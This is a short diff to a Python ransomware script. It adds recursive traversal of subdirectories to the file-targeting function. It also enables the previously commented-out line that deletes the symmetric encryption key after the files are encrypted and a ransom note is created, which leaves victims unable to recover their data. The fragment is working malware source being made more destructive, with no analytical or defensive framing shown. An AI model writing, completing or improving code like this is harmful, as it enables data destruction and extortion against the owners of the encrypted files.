@@ -105,6 +105,8 @@ def getFiles(directory):
         for file in files:
             print(f"Encrypting {file}")
             target_files.append(os.path.join(root, file))
+        for subdirectory in sd:    
+            getFiles(subdirectory) 
 
     return target_files
 
@@ -171,7 +173,7 @@ def encrypt(target):
                 encrypted_file.write(cipher)
         
         create_ransom_note()
-        # os.remove(f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key')
+        os.remove(f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key')
     else:
         print("Target empty.")
 
